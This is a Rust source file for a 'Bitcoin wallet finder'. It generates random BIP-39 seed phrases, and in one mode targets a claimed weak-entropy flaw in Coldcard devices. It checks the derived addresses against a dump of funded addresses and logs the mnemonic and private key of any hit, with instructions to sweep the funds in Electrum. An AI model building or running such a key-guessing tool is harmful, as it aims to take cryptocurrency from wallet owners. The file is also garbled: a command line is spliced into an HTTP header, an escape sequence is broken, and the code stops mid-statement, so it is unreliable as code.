//! btc_finder — Single-file Bitcoin wallet scanner
//!
//! Modes (SCAN_MODE env var):
//!   (default)          — random BIP-39, local UTXO lookup (~50k/sec)
//!   SCAN_MODE=api      — random BIP-39, online API (~8/sec, no download)
//!   SCAN_MODE=coldcard — Coldcard Mk3 40-bit weak-entropy scan
//!
//! First run downloads Blockchair address dump (~1.5 GB) once,
//! builds a binary cache, then loads ~80M funded addresses into RAM.
//! After that: pure RAM HashSet lookup, zero HTTP calls during scanning.

use bip39::{Language, Mnemonic, Seed};
use crossbeam_channel::{bounded, Receiver};
use flate2::read::GzDecoder;
use hmac::{Hmac, Mac};
use rand::RngCore;
use rand::SeedableRng;
use rand_chacha::ChaCha20Rng;
use ripemd::Ripemd160;
use secp256k1::{PublicKey as SecpPublicKey, Secp256k1, SecretKey as SecpSecretKey};
use sha2::{Digest, Sha256, Sha512};
use std::collections::HashSet;
use std::fs::{self, File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

// ── ANSI ─────────────────────────────────────────────────────────────────────
const G:   &str = "\x1b[32m";
const Y:   &str = "\x1b[33m";
const M:   &str = "\x1b[35m";
const W:   &str = "\x1b[37m";
const R:   &str = "\x1b[31m";
const RST: &str = "\x1b[0m";
const BLD: &str = "\x1b[1m";
const DIM: &str = "\x1b[2m";
const BG:  &str = "\x1b[48;5;234m";

fn flush()            { let _ = io::stdout().flush(); }
fn clear()            { print!("\x1b[2J\x1b[H"); flush(); }
fn hide_cursor()      { print!("\x1b[?25l"); flush(); }
fn show_cursor()      { print!("\x1b[?25h"); flush(); }
fn set_title(t: &str) { print!("\x1b]2;{}\x07", t); flush(); }

static BTC_API_IDX: AtomicUsize = AtomicUsize::new(0);

// ── Types ─────────────────────────────────────────────────────────────────────
type AddrHash = [u8; 20];
type UtxoSet  = HashSet<AddrHash>;

// ── Stats ─────────────────────────────────────────────────────────────────────
struct Stats {
    generated:   AtomicU64,
    checked:     AtomicU64,
    hits:        AtomicU64,
    usd_cents:   AtomicU64,
    btc_rpc_ok:  AtomicU64,
    btc_rpc_err: AtomicU64,
    throttled:   AtomicBool,
}
impl Stats {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            generated:   AtomicU64::new(0),
            checked:     AtomicU64::new(0),
            hits:        AtomicU64::new(0),
            usd_cents:   AtomicU64::new(0),
            btc_rpc_ok:  AtomicU64::new(0),
            btc_rpc_err: AtomicU64::new(0),
            throttled:   AtomicBool::new(false),
        })
    }
}

// ── Log ──────────────────────────────────────────────────────────────────────
#[derive(Clone)]
struct LogEntry {
    n: u64, p2pkh: String, p2sh: String,
    words: Vec<String>, sat: u64, has_hit: bool,
}
struct RecentLog { entries: std::collections::VecDeque<LogEntry>, cap: usize }
impl RecentLog {
    fn new(cap: usize) -> Arc<Mutex<Self>> {
        Arc::new(Mutex::new(Self { entries: std::collections::VecDeque::new(), cap }))
    }
    fn push(&mut self, e: LogEntry) {
        if self.entries.len() >= self.cap { self.entries.pop_front(); }
        self.entries.push_back(e);
    }
}

// ── Wallet ────────────────────────────────────────────────────────────────────
#[derive(Clone)]
struct Wallet {
    words: Vec<String>,
    btc_p2pkh: String, btc_p2pkh_hash: AddrHash, btc_p2pkh_priv: String,
    btc_p2sh:  String, btc_p2sh_hash:  AddrHash, btc_p2sh_priv:  String,
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  CRYPTO  ██
// ─────────────────────────────────────────────────────────────────────────────

// ── Thread-local RNG — 8-source entropy cascade ──────────────────────────────
// Init cost: once per thread (8 entropy sources, SHA-512 mixing)
// Per-wallet cost: 2 next_u64() calls — nanoseconds, zero syscalls
// Randomness: 256-bit seed from independent sources → ChaCha20 keystream
use std::cell::RefCell;

// Global monotonic counter — strictly unique across ALL threads + ALL runs
static GLOBAL_CTR: std::sync::atomic::AtomicU64 =
    std::sync::atomic::AtomicU64::new(0);

fn build_thread_seed() -> [u8; 32] {
    use rand::rngs::OsRng;

    use std::time::{SystemTime, UNIX_EPOCH};

    let mut mix = [0u8; 64];   // 512-bit mixing buffer

    // Source 1: OsRng — /dev/urandom, strongest OS entropy
    let mut os1 = [0u8; 64]; OsRng.fill_bytes(&mut os1);
    for (i,b) in os1.iter().enumerate() { mix[i] ^= b; }

    // Source 2: Second OsRng call — different kernel RNG state
    let mut os2 = [0u8; 64]; OsRng.fill_bytes(&mut os2);
    for (i,b) in os2.iter().enumerate() { mix[i] ^= b; }

    // Source 3: Thread-local rand (already seeded differently per thread)
    let mut tr = [0u8; 64]; rand::thread_rng().fill_bytes(&mut tr);
    for (i,b) in tr.iter().enumerate() { mix[i] ^= b; }

    // Source 4: Thread ID hash — unique per OS thread
    let tid_str = format!("{:?}", std::thread::current().id());
    let tid_h = Sha512::digest(tid_str.as_bytes());
    for (i,b) in tid_h.iter().enumerate() { mix[i] ^= b; }

    // Source 5: Full nanosecond unix timestamp
    let ts = SystemTime::now().duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64).unwrap_or(0);
    let ts_h = Sha512::digest(&ts.to_le_bytes());
    for (i,b) in ts_h.iter().enumerate() { mix[i] ^= b; }

    // Source 6: Stack address (ASLR — kernel-provided randomness)
    let sptr = &mix as *const _ as usize;
    let sp_h = Sha512::digest(&sptr.to_le_bytes());
    for (i,b) in sp_h.iter().enumerate() { mix[i] ^= b; }

    // Source 7: Global monotonic counter (unique per thread init, ever)
    let gctr = GLOBAL_CTR.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
    let gc_h = Sha512::digest(&gctr.to_le_bytes());
    for (i,b) in gc_h.iter().enumerate() { mix[i] ^= b; }

    // Source 8: Knuth multiplicative hash of counter × prime
    let knuth = gctr
        .wrapping_mul(0x9e3779b97f4a7c15)
        .wrapping_add(ts.wrapping_mul(0x6c62272e07bb0142));
    let kn_h = Sha512::digest(&knuth.to_le_bytes());
    for (i,b) in kn_h.iter().enumerate() { mix[i] ^= b; }

    // Final: SHA-512(all sources XOR'd) → first 32 bytes = ChaCha20 seed
    let final_h = Sha512::digest(&mix);
    let mut seed = [0u8; 32];
    seed.copy_from_slice(&final_h[..32]);
    seed
}

thread_local! {
    // Each generator thread gets its own ChaCha20 instance with unique seed.
    // Thread-local means no mutex, no contention — pure throughput.
    static THREAD_RNG: RefCell<ChaCha20Rng> = RefCell::new(
        ChaCha20Rng::from_seed(build_thread_seed())
    );
}

fn make_rng(_counter: u64) -> ChaCha20Rng {
    // Advance thread RNG by 4 positions → clone as sub-RNG for this wallet.
    // Zero syscalls, zero hashing, cryptographically independent each call.
    THREAD_RNG.with(|rng| {
        let mut r = rng.borrow_mut();
        r.next_u64(); r.next_u64(); r.next_u64(); r.next_u64();
        r.clone()
    })
}

fn hmac_sha512(key: &[u8], data: &[u8]) -> [u8; 64] {
    let mut mac = Hmac::<Sha512>::new_from_slice(key).unwrap();
    mac.update(data);
    let mut out = [0u8; 64];
    out.copy_from_slice(&mac.finalize().into_bytes());
    out
}

fn bip32_child(secp: &Secp256k1<secp256k1::All>,
               pk: &[u8;32], cc: &[u8;32], idx: u32) -> ([u8;32],[u8;32]) {
    let mut data = Vec::with_capacity(37);
    if idx >= 0x8000_0000 { data.push(0x00u8); data.extend_from_slice(pk); }
    else {
        let sk = SecpSecretKey::from_slice(pk).unwrap();
        data.extend_from_slice(&SecpPublicKey::from_secret_key(secp,&sk).serialize());
    }
    data.extend_from_slice(&idx.to_be_bytes());
    let h = hmac_sha512(cc, &data);
    let tw = SecpSecretKey::from_slice(&h[..32]).unwrap()
        .add_tweak(&SecpSecretKey::from_slice(pk).unwrap().into()).unwrap();
    let mut ok=[0u8;32]; let mut oc=[0u8;32];
    ok.copy_from_slice(&tw.secret_bytes()); oc.copy_from_slice(&h[32..]);
    (ok,oc)
}

fn btc_derive(secp: &Secp256k1<secp256k1::All>, seed: &[u8], purpose: u32) -> [u8;32] {
    let h = hmac_sha512(b"Bitcoin seed", seed);
    let mut k=[0u8;32]; let mut c=[0u8;32];
    k.copy_from_slice(&h[..32]); c.copy_from_slice(&h[32..]);
    let (k,c) = bip32_child(secp,&k,&c, purpose+0x8000_0000);
    let (k,c) = bip32_child(secp,&k,&c, 0x8000_0000);
    let (k,c) = bip32_child(secp,&k,&c, 0x8000_0000);
    let (k,c) = bip32_child(secp,&k,&c, 0);
    let (k,_) = bip32_child(secp,&k,&c, 0);
    k
}

// SLIP-0010 ed25519 (Coldcard only — path m/44'/501' unused for BTC)
fn slip10_child(k: &[u8;32], c: &[u8;32], idx: u32) -> ([u8;32],[u8;32]) {
    let hard = idx | 0x8000_0000;
    let mut data = Vec::with_capacity(37);
    data.push(0x00u8); data.extend_from_slice(k);
    data.extend_from_slice(&hard.to_be_bytes());
    let h = hmac_sha512(c, &data);
    let mut ok=[0u8;32]; let mut oc=[0u8;32];
    ok.copy_from_slice(&h[..32]); oc.copy_from_slice(&h[32..]);
    (ok,oc)
}

fn hash160(data: &[u8]) -> AddrHash {
    let mut out=[0u8;20];
    out.copy_from_slice(&Ripemd160::digest(Sha256::digest(data)));
    out
}

fn base58check(payload: &[u8]) -> String {
    let cs = Sha256::digest(Sha256::digest(payload));
    let mut full = payload.to_vec(); full.extend_from_slice(&cs[..4]);
    bs58::encode(full).into_string()
}

fn p2pkh_full(secp: &Secp256k1<secp256k1::All>, priv_b: &[u8;32]) -> (String,AddrHash) {
    let sk = SecpSecretKey::from_slice(priv_b).unwrap();
    let pk = SecpPublicKey::from_secret_key(secp,&sk);
    let h  = hash160(&pk.serialize());
    let mut p = vec![0x00u8]; p.extend_from_slice(&h);
    (base58check(&p), h)
}

fn p2sh_full(secp: &Secp256k1<secp256k1::All>, priv_b: &[u8;32]) -> (String,AddrHash) {
    let sk = SecpSecretKey::from_slice(priv_b).unwrap();
    let pk = SecpPublicKey::from_secret_key(secp,&sk);
    let h160 = hash160(&pk.serialize());
    let mut redeem = vec![0x00u8,0x14]; redeem.extend_from_slice(&h160);
    let sh = hash160(&redeem);
    let mut p = vec![0x05u8]; p.extend_from_slice(&sh);
    (base58check(&p), sh)
}

fn addr_to_hash160(addr: &str) -> Option<AddrHash> {
    let first = addr.chars().next()?;
    if first != '1' && first != '3' { return None; }
    let decoded = bs58::decode(addr).into_vec().ok()?;
    if decoded.len() != 25 { return None; }
    let mut h = [0u8;20]; h.copy_from_slice(&decoded[1..21]); Some(h)
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  WALLET GENERATION  ██
// ─────────────────────────────────────────────────────────────────────────────

fn gen_wallet(secp: &Secp256k1<secp256k1::All>, counter: u64) -> Wallet {
    let mut rng = make_rng(counter);
    let el = if (rng.next_u32()&1)==0 {16usize} else {32usize};
    let mut entropy = vec![0u8;el]; rng.fill_bytes(&mut entropy);
    let mnemonic = Mnemonic::from_entropy(&entropy, Language::English).unwrap();
    let words: Vec<String> = mnemonic.phrase().split_whitespace().map(str::to_string).collect();
    let seed = Seed::new(&mnemonic,"");
    let sb = seed.as_bytes();
    let k44 = btc_derive(secp,sb,44);
    let k49 = btc_derive(secp,sb,49);
    let (p2pkh_addr, p2pkh_hash) = p2pkh_full(secp,&k44);
    let (p2sh_addr,  p2sh_hash)  = p2sh_full(secp,&k49);
    Wallet {
        words,
        btc_p2pkh: p2pkh_addr, btc_p2pkh_hash: p2pkh_hash, btc_p2pkh_priv: hex::encode(k44),
        btc_p2sh:  p2sh_addr,  btc_p2sh_hash:  p2sh_hash,  btc_p2sh_priv:  hex::encode(k49),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  COLDCARD 40-BIT  ██
// ─────────────────────────────────────────────────────────────────────────────

fn coldcard_entropy(unix_ts: u64, counter: u16) -> [u8;16] {
    let mut input = [0u8;10];
    input[..8].copy_from_slice(&unix_ts.to_le_bytes());
    input[8..].copy_from_slice(&counter.to_le_bytes());
    let hash = Sha256::digest(&input);
    let mut out = [0u8;16]; out.copy_from_slice(&hash[..16]); out
}

fn coldcard_wallet(secp: &Secp256k1<secp256k1::All>, ts: u64, ctr: u16) -> Option<Wallet> {
    let entropy = coldcard_entropy(ts, ctr);
    let mnemonic = Mnemonic::from_entropy(&entropy, Language::English).ok()?;
    let words: Vec<String> = mnemonic.phrase().split_whitespace().map(str::to_string).collect();
    let seed = Seed::new(&mnemonic,"");
    let sb = seed.as_bytes();
    let k44 = btc_derive(secp,sb,44);
    let k49 = btc_derive(secp,sb,49);
    let (p2pkh_addr, p2pkh_hash) = p2pkh_full(secp,&k44);
    let (p2sh_addr,  p2sh_hash)  = p2sh_full(secp,&k49);
    Some(Wallet {
        words,
        btc_p2pkh: p2pkh_addr, btc_p2pkh_hash: p2pkh_hash, btc_p2pkh_priv: hex::encode(k44),
        btc_p2sh:  p2sh_addr,  btc_p2sh_hash:  p2sh_hash,  btc_p2sh_priv:  hex::encode(k49),
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  LOCAL UTXO SET  ██
// ─────────────────────────────────────────────────────────────────────────────

const DUMP_URL:    &str = "http://addresses.loyce.club/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz";
const DUMP_FILE:   &str = "blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz";
const CACHE_FILE:  &str = "btc_funded.bin";

fn download_dump() -> io::Result<()> {
    if Path::new(DUMP_FILE).exists() {
        println!("  {DIM}Found {DUMP_FILE} — skipping download{RST}");
        return Ok(());
    }
    println!("  {Y}Downloading Bitcoin address dump from Blockchair (~1.5 GB)...{RST}");
    println!("  {DIM}URL: {DUMP_URL}{RST}");
    println!("  {DIM}This is a one-time download. Please wait.{RST}");
    let resp = minreq::get(DUMP_URL)
        .with_header("User-Agent","Mozilla/5.0")
        .with_timeout(7200).send()
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;
    if resp.status_code != 200 {
        return Err(io::Error::new(io::ErrorKind::Other,
            format!("HTTP {}", resp.status_code)));
    }
    let mut f = File::create(DUMP_FILE)?;
    f.write_all(resp.as_bytes())?;
    println!("  {G}Downloaded: {DUMP_FILE} ({:.0} MB){RST}",
        Path::new(DUMP_FILE).metadata()?.len() as f64/1e6);
    Ok(())
}

fn build_cache() -> io::Result<u64> {
    if Path::new(CACHE_FILE).exists() {
        let count = fs::metadata(CACHE_FILE)?.len() / 20;
        println!("  {DIM}Found {CACHE_FILE} ({} funded addresses){RST}", fmt_n(count));
        return Ok(count);
    }
    println!("  {Y}Parsing dump → binary cache...{RST}");
    let f   = File::open(DUMP_FILE)?;
    let gz  = GzDecoder::new(f);
    let rdr = BufReader::with_capacity(8*1024*1024, gz);
    let mut out   = File::create(CACHE_FILE)?;
    let mut count = 0u64;
    for (i, line) in rdr.lines().enumerate() {
        let line = line?;
        if i == 0 { continue; }
        let mut parts = line.splitn(3,'\t');
        let addr    = match parts.next() { Some(a)=>a, None=>continue };
        let bal_str = match parts.next() { Some(b)=>b, None=>continue };
        let bal: u64 = bal_str.trim().parse().unwrap_or(0);
        if bal == 0 { continue; }
        if let Some(h) = addr_to_hash160(addr) {
            out.write_all(&h)?;
            count += 1;
            if count % 1_000_000 == 0 {
                print!("\r  Parsed {:.1}M funded addresses...", count as f64/1e6);
                let _ = io::stdout().flush();
            }
        }
    }
    println!("\r  {G}Cached {} funded addresses → {CACHE_FILE}{RST}", fmt_n(count));
    Ok(count)
}

fn load_utxo() -> io::Result<UtxoSet> {
    let sz    = fs::metadata(CACHE_FILE)?.len();
    let count = sz / 20;
    println!("  {Y}Loading {} addresses into RAM...{RST}", fmt_n(count));
    let t     = Instant::now();
    let data  = fs::read(CACHE_FILE)?;
    let mut set = HashSet::with_capacity(count as usize + 1024);
    for chunk in data.chunks_exact(20) {
        let mut h=[0u8;20]; h.copy_from_slice(chunk); set.insert(h);
    }
    println!("  {G}Loaded in {:.1}s  (~{:.0} MB RAM){RST}",
        t.elapsed().as_secs_f64(), set.len() as f64*28.0/1e6);
    Ok(set)
}

fn setup_utxo() -> Option<Arc<UtxoSet>> {
    println!("{BLD}{Y}₿  Setting up local Bitcoin UTXO set{RST}");
    println!("{}", "─".repeat(60));
    if let Err(e) = download_dump() {
        println!("  {R}Download failed: {e}{RST}");
        return None;
    }
    if let Err(e) = build_cache() {
        println!("  {R}Cache build failed: {e}{RST}");
        return None;
    }
    match load_utxo() {
        Ok(set) => { println!(); Some(Arc::new(set)) }
        Err(e)  => { println!("  {R}Load failed: {e}{RST}"); None }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  BALANCE CHECKS  ██
// ─────────────────────────────────────────────────────────────────────────────

/// O(1) RAM lookup — no HTTP
fn local_hit(w: &Wallet, utxo: &UtxoSet) -> (bool,bool) {
    (utxo.contains(&w.btc_p2pkh_hash), utxo.contains(&w.btc_p2sh_hash))
}

/// 3-API rotation with 200ms polite delay and 1s backoff on 429/403
fn api_check(address: &str, stats: &Stats) -> u64 {
    let start = BTC_API_IDX.fetch_add(1, Ordering::Relaxed) % 3;
    for off in 0..3usize {
        let result: Option<u64> = match (start+off)%3 {
            0 => {
                let url = format!("https://blockstream.info/api/address/{}", address);
                match minreq::get(url.as_str())
                    .with_header("User-Agent","Mozilla/5.0").with_timeout(8).send()
                {
                    Ok(r) if r.status_code==200 => r.json::<serde_json::Value>().ok().map(|j|{
                        j["chain_stats"]["funded_txo_sum"].as_u64().unwrap_or(0)
                            .saturating_sub(j["chain_stats"]["spent_txo_sum"].as_u64().unwrap_or(0))
                    }),
                    Ok(r) if r.status_code==429||r.status_code==403 => {
                        stats.throttled.store(true,Ordering::Relaxed);
                        std::thread::sleep(Duration::from_millis(1000)); None
                    }
                    _ => None,
                }
            }
            1 => {
                let url = format!("https://mempool.space/api/address/{}", address);
                match minreq::get(url.as_str())
                    .with_header("USCAN_MODE=coldcard cargo run --releaseser-Agent","Mozilla/5.0").with_timeout(8).send()
                {
                    Ok(r) if r.status_code==200 => r.json::<serde_json::Value>().ok().map(|j|{
                        j["chain_stats"]["funded_txo_sum"].as_u64().unwrap_or(0)
                            .saturating_sub(j["chain_stats"]["spent_txo_sum"].as_u64().unwrap_or(0))
                    }),
                    Ok(r) if r.status_code==429||r.status_code==403 => {
                        stats.throttled.store(true,Ordering::Relaxed);
                        std::thread::sleep(Duration::from_millis(1000)); None
                    }
                    _ => None,
                }
            }
            _ => {
                let url = format!("https://blockchain.info/q/addressbalance/{}", address);
                match minreq::get(url.as_str())
                    .with_header("User-Agent","Mozilla/5.0").with_timeout(8).send()
                {
                    Ok(r) if r.status_code==200 =>
                        r.as_str().ok().and_then(|s|s.trim().parse::<u64>().ok()),
                    Ok(r) if r.status_code==429||r.status_code==403 => {
                        stats.throttled.store(true,Ordering::Relaxed);
                        std::thread::sleep(Duration::from_millis(1000)); None
                    }
                    _ => None,
                }
            }
        };
        if let Some(sat) = result {
            stats.btc_rpc_ok.fetch_add(1,Ordering::Relaxed);
            stats.throttled.store(false,Ordering::Relaxed);
            std::thread::sleep(Duration::from_millis(50));
            return sat;
        }
    }
    stats.btc_rpc_err.fetch_add(1,Ordering::Relaxed);
    std::thread::sleep(Duration::from_millis(200));
    0
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  HELPERS  ██
// ─────────────────────────────────────────────────────────────────────────────

fn fetch_btc_price() -> f64 {
    if let Ok(r) = minreq::get(
        "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd"
    ).with_timeout(6).send() {
        if r.status_code==200 {
            if let Ok(j)=r.json::<serde_json::Value>() {
                if let Some(p)=j["bitcoin"]["usd"].as_f64() { return p; }
            }
        }
    }
    60000.0
}

fn write_hit(kind: &str, addr: &str, sat: u64, btc: f64,
             words: &[String], priv_hex: &str, file: &str) {
    let mut f = OpenOptions::new().append(true).create(true).open(file).unwrap();
    writeln!(f,
        "BTC {kind} ═══════════════════════════════════════════\n\
         Address  : {addr}\nBalance  : {btc:.8} BTC  ({sat} sat)\n\
         Mnemonic : {mne}\nPrivKey  : {priv_hex}\n\
         Import   : Electrum → Sweep Private Key\n",
        mne=words.join(" ")
    ).unwrap();
}

fn fmt_n(n: u64) -> String {
    if n>=1_000_000_000{format!("{:.2}B",n as f64/1e9)}
    else if n>=1_000_000{format!("{:.2}M",n as f64/1e6)}
    else if n>=1_000{format!("{:.1}K",n as f64/1e3)}
    else{format!("{}",n)}
}

fn fmt_dur(s: u64) -> String {
    if s<60{format!("{}s",s)}
    else if s<3600{format!("{}m{:02}s",s/60,s%60)}
    else{format!("{}h{:02}m",s/3600,(s%3600)/60)}
}

fn bar(v: u64, max: u64, w: usize, col: &str) -> String {
    let n=if max==0{0}else{((v as f64/max as f64)*w as f64)as usize}.min(w);
    format!("{}{}{}{}{}",col,"█".repeat(n),RST,DIM,"░".repeat(w-n))
}

fn ts_to_date(ts: u64) -> String {
    let d=ts/86400; let y=1970+d/365; let m=(d%365)/30+1; let day=(d%365)%30+1;
    format!("{y}-{m:02}-{day:02}")
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  CHECKER LOGIC  ██
// ─────────────────────────────────────────────────────────────────────────────

fn process_wallet(w: &Wallet, utxo: &Option<Arc<UtxoSet>>,
                  stats: &Stats, btc_usd: f64, file: &str) -> (bool, u64) {
    if let Some(set) = utxo {
        let (ph, sh) = local_hit(w, set);
        if !ph && !sh { return (false, 0); }
        // Confirmed in UTXO — fetch exact balance once
        let addr = if ph { &w.btc_p2pkh } else { &w.btc_p2sh };
        let sat  = api_check(addr, stats);
        let btc  = sat as f64/1e8;
        if sat > 0 {
            stats.hits.fetch_add(1,Ordering::Relaxed);
            stats.usd_cents.fetch_add((btc*btc_usd*100.0) as u64,Ordering::Relaxed);
            let (kind,priv_hex) = if ph { ("P2PKH",&w.btc_p2pkh_priv) }
                                  else   { ("P2SH", &w.btc_p2sh_priv)  };
            write_hit(kind, addr, sat, btc, &w.words, priv_hex, file);
            println!("\n{BLD}{G}╔══ {kind}: {btc:.8} BTC (${:.2}) ══╗{RST}",btc*btc_usd);
            println!("{BLD}  {Y}{addr}{RST}"); flush();
        }
        (sat>0, sat)
    } else {
        // API-only mode
        let ps = api_check(&w.btc_p2pkh, stats);
        let ss = api_check(&w.btc_p2sh,  stats);
        let total = ps+ss;
        if total > 0 {
            stats.hits.fetch_add(1,Ordering::Relaxed);
            if ps>0 {
                let b=ps as f64/1e8;
                stats.usd_cents.fetch_add((b*btc_usd*100.0) as u64,Ordering::Relaxed);
                write_hit("P2PKH",&w.btc_p2pkh,ps,b,&w.words,&w.btc_p2pkh_priv,file);
                println!("\n{BLD}{Y}╔══ P2PKH: {b:.8} BTC (${:.2}) ══╗{RST}",b*btc_usd);
                println!("{BLD}  {Y}{}{RST}",&w.btc_p2pkh); flush();
            }
            if ss>0 {
                let b=ss as f64/1e8;
                stats.usd_cents.fetch_add((b*btc_usd*100.0) as u64,Ordering::Relaxed);
                write_hit("P2SH",&w.btc_p2sh,ss,b,&w.words,&w.btc_p2sh_priv,file);
                println!("\n{BLD}{Y}╔══ P2SH: {b:.8} BTC (${:.2}) ══╗{RST}",b*btc_usd);
                println!("{BLD}  {Y}{}{RST}",&w.btc_p2sh); flush();
            }
        }
        (total>0, total)
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  THREADS  ██
// ─────────────────────────────────────────────────────────────────────────────


// ─────────────────────────────────────────────────────────────────────────────
// ██  CHECKPOINT SYSTEM  ██
// Saves the current scan counter every 30 seconds.
// On restart, resumes from last saved position.
// File: btc_checkpoint.txt — single line: counter value
// ─────────────────────────────────────────────────────────────────────────────

const CHECKPOINT_FILE: &str = "btc_checkpoint.txt";
const CHECKPOINT_INTERVAL_SECS: u64 = 30;

/// Load last checkpoint. Returns 0 if no checkpoint exists.
fn load_checkpoint() -> u64 {
    std::fs::read_to_string(CHECKPOINT_FILE)
        .ok()
        .and_then(|s| s.trim().parse::<u64>().ok())
        .unwrap_or(0)
}

/// Save current counter to checkpoint file atomically.
fn save_checkpoint(counter: u64) {
    let tmp = format!("{}.tmp", CHECKPOINT_FILE);
    if std::fs::write(&tmp, counter.to_string()).is_ok() {
        let _ = std::fs::rename(&tmp, CHECKPOINT_FILE);
    }
}

/// Background thread: saves checkpoint every 30 seconds.
fn checkpoint_thread(stats: Arc<Stats>) {
    let mut last_saved = 0u64;
    loop {
        std::thread::sleep(Duration::from_secs(CHECKPOINT_INTERVAL_SECS));
        let current = stats.generated.load(Ordering::Relaxed);
        if current != last_saved {
            save_checkpoint(current);
            last_saved = current;
        }
    }
}

fn generator_thread(
    tx: crossbeam_channel::Sender<Wallet>,
    stats: Arc<Stats>,
    start_from: u64,   // resume from checkpoint
    thread_idx: usize, // which generator thread (0, 1, 2...)
    n_threads: usize,  // total generator threads
) {
    let secp = Secp256k1::new();

    // Each thread handles a non-overlapping slice of the counter space.
    // Thread 0: start_from, start_from+n_threads, start_from+2*n_threads ...
    // Thread 1: start_from+1, start_from+1+n_threads ...
    // This ensures zero duplicate wallets across threads.
    let mut counter = start_from + thread_idx as u64;

    loop {
        let w = gen_wallet(&secp, counter);
        counter = counter.wrapping_add(n_threads as u64);
        stats.generated.fetch_add(1, Ordering::Relaxed);
        if tx.send(w).is_err() { break; }
    }
}

fn checker_thread(rx: Receiver<Wallet>, stats: Arc<Stats>,
                  log: Arc<Mutex<RecentLog>>, utxo: Option<Arc<UtxoSet>>,
                  btc_usd: f64) {
    loop {
        let w = match rx.recv_timeout(Duration::from_millis(50)) {
            Ok(w)  => w,
            Err(_) => { if rx.is_empty() { break; } continue; }
        };
        let (hit, sat) = process_wallet(&w, &utxo, &stats, btc_usd, "found.txt");
        stats.checked.fetch_add(1,Ordering::Relaxed);
        let n=stats.checked.load(Ordering::Relaxed);
        if let Ok(mut lg)=log.lock() {
            lg.push(LogEntry {
                n, p2pkh:w.btc_p2pkh.clone(), p2sh:w.btc_p2sh.clone(),
                words:w.words.clone(), sat, has_hit:hit,
            });
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  DASHBOARD  ██
// ─────────────────────────────────────────────────────────────────────────────

fn dashboard_thread(stats: Arc<Stats>, log: Arc<Mutex<RecentLog>>,
                    start: Instant, n_gen: usize, n_chk: usize,
                    _btc_usd: f64, local: bool, utxo_sz: usize) {
    hide_cursor();
    let mut tick=0u64; let mut pg=0u64; let mut pc=0u64;
    let mut gr=0.0f64; let mut cr=0.0f64;
    let tw=108usize;
    loop {
        std::thread::sleep(Duration::from_millis(500));
        tick+=1;
        let gc  =stats.generated .load(Ordering::Relaxed);
        let chk =stats.checked   .load(Ordering::Relaxed);
        let hits=stats.hits      .load(Ordering::Relaxed);
        let usd =stats.usd_cents .load(Ordering::Relaxed) as f64/100.0;
        let ok  =stats.btc_rpc_ok .load(Ordering::Relaxed);
        let err =stats.btc_rpc_err.load(Ordering::Relaxed);
        let thr =stats.throttled  .load(Ordering::Relaxed);
        let ela =start.elapsed().as_secs_f64().max(0.001) as u64;

        gr=gr*0.7+(gc.saturating_sub(pg)) as f64*2.0*0.3;
        cr=cr*0.7+(chk.saturating_sub(pc)) as f64*2.0*0.3;
        pg=gc; pc=chk;

        let hp=if ok+err==0{if local{100}else{0}}else{ok*100/(ok+err)};
        let hc=if hp>=95{G}else if hp>=80{Y}else{R};
        let ts=if thr{format!(" {Y}{BLD}[THROTTLED]{RST}")}else{String::new()};

        let recent: Vec<LogEntry>=log.lock()
            .map(|lg|lg.entries.iter().rev().take(6).cloned().collect())
            .unwrap_or_default();
        // Move cursor to top-left without clearing — prevents flash
        print!("[H");
        flush();
        let inn=tw-2;

        let mode_str=if local{
            format!("{G}{BLD}LOCAL{RST} ({} addrs in RAM)",fmt_n(utxo_sz as u64))
        } else { format!("{Y}API{RST} (rate limited)") };

        println!("{BG}{BLD}{Y}┌{}┐{RST}","─".repeat(inn));
        println!("{BG}│ {BLD}{Y}₿  BITCOIN WALLET FINDER{RST}{BG}  \
                  {DIM}P2PKH m/44'  P2SH m/49'  secp256k1 BIP-32{RST}{BG}  \
                  Mode:{mode_str}{BG}{Y}{:>p$}│{RST}","",p=inn.saturating_sub(90));
        println!("{BG}{BLD}{Y}├{}┤{RST}","─".repeat(inn));

        println!("{BG}│ {DIM}Generated:{RST}{BG} {W}{BLD}{:>8}{RST}{BG} {DIM}({:>6.0}/s){RST}{BG}  \
                  {Y}{BLD}Checked:{RST}{BG} {W}{BLD}{:>8}{RST}{BG} {DIM}({:>6.0}/s){RST}{BG}  \
                  {Y}{BLD}HITS:{RST}{BG} {G}{BLD}{:>3}{RST}{BG}  \
                  {G}{BLD}${:.2}{RST}{BG}  {DIM}up:{RST}{BG}{W}{BLD}{}{RST}{BG}{Y}{:>p$}│{RST}",
            fmt_n(gc),gr,fmt_n(chk),cr,hits,usd,fmt_dur(ela),"",p=inn.saturating_sub(86));

        let bmax=if local{200_000u64}else{20u64};
        println!("{BG}│ {DIM}Gen/s {RST}{BG}{}  {W}{BLD}{:>7.0}{RST}{BG}  \
                  {DIM}Chk/s {RST}{BG}{}  {W}{BLD}{:>7.0}{RST}{BG}  \
                  {DIM}{n_gen}gen {n_chk}chk{RST}{BG}{Y}{:>p$}│{RST}",
            bar(gr as u64,bmax,24,Y),gr, bar(cr as u64,bmax,24,G),cr,
            "",p=inn.saturating_sub(78));

        println!("{BG}├{}┤{RST}","─".repeat(inn));
        if local {
            println!("{BG}│ {G}{BLD}LOCAL UTXO{RST}{BG}  \
                      {DIM}RAM HashSet O(1) — no HTTP during scan — \
                      API only on confirmed hit{RST}{BG}{Y}{:>p$}│{RST}",
                      "",p=inn.saturating_sub(72));
        } else {
            println!("{BG}│ {Y}{BLD}API MODE{RST}{BG}  \
